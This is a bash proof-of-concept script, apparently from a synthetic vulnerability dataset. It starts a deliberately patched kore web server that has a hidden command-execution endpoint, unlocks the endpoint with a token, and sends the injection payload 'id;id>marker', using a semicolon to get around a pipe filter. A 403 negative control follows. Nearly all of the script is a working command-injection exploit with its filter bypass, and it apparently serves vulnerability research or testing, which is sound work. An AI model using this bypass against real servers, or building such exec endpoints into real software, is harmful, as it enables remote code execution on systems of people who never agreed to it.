#!/usr/bin/env bash
# PoC for 164_kore_C3I3S2
# Axes: C3 (config file + runtime init) / I3 (struct dispatch) / S2 (pipe blocked, semicolon bypass)
#
# C3 flow: --exec-config sets exec_cfg (enabled, logging, secret).
#          /exec/init?token=<secret> must be called first.
# S2 bypass: use semicolon instead of pipe.
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (kore) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/kore"
WWWROOT="/tmp/poc_164_www"
MARKER="/tmp/poc_164_marker"
EXEC_CONF="/tmp/poc_164.conf"
PORT=18164
NEG_PORT=19164

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$EXEC_CONF" /tmp/poc_164_kore.conf /tmp/poc_164_neg.conf
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Create exec config file with secret
cat > "$EXEC_CONF" <<EOF
exec_mode = 1
exec_logging = 1
exec_secret = s3cr3t164
EOF

# Write kore config file registering BOTH handlers
cat > /tmp/poc_164_kore.conf <<KCONF
server notls {
	bind 0.0.0.0 ${PORT}
	tls no
}

workers 1

domain * {
	attach notls

	route /exec/init {
		handler exec_init_page
		methods get
	}

	route /exec {
		handler exec_page
		methods get
	}
}
KCONF

# ── start server ──────────────────────────────────────────────────────────────
echo "[*] starting kore with --exec-config on port $PORT..."
"$BINARY" -c /tmp/poc_164_kore.conf -n -r --exec-config "$EXEC_CONF" &
SERVER_PID=$!
sleep 1

# ── C3 step 1: call /exec/init with correct token ─────────────────────────────
echo "[*] calling /exec/init with correct token..."
curl -sf "http://127.0.0.1:${PORT}/exec/init?token=s3cr3t164" > /dev/null

# ── C3 step 2: trigger RCE with S2 bypass (semicolon) ────────────────────────
echo "[*] sending payload: id;id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?id;id>${MARKER}" > /dev/null

# ── verify ───────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: without --exec-config → exec returns 403 ───────────────
echo "[*] verifying gate: endpoint must return 403 without --exec-config..."
cat > /tmp/poc_164_neg.conf <<KCONF
server notls {
	bind 0.0.0.0 ${NEG_PORT}
	tls no
}

workers 1

domain * {
	attach notls

	route /exec/init {
		handler exec_init_page
		methods get
	}

	route /exec {
		handler exec_page
		methods get
	}
}
KCONF
"$BINARY" -c /tmp/poc_164_neg.conf -n -r &
NEG_PID=$!
sleep 1
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?id" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: got 403 without --exec-config"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
